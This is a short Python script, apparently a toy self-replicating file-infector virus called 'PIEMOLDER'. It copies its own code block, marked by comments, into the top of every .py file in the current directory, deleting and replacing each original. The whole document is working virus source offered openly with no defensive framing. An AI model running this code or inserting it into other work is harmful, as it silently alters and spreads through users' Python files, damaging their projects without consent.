# Let's make it self-replicating...


# PIEMOLDER:START

def execute(virus):
	import glob
	import os
	allpies = glob.glob("*.py")

	for py in allpies:
		thepie = open(py, "r")
		rottenpie = open("%s.rotten" % py, "w")

		rottenpie.write(virus)

		for line in thepie.readlines():
			rottenpie.write(line)

		thepie.close()
		rottenpie.close()

		os.remove(py)
		os.rename("%s.rotten" % py, py)


import os
virus = os.path.basename(__file__)
vfile = open(virus, "r")
copyover = False
vstring = ""
for line in vfile.readlines():
	if line.find("# PIEMOLDER:START") == 0:
		copyover = True
	if line.find("# PIEMOLDER:END") == 0:
		vstring += line
		copyover = False
	if copyover:
		vstring += line

execute(vstring)


# PIEMOLDER:END



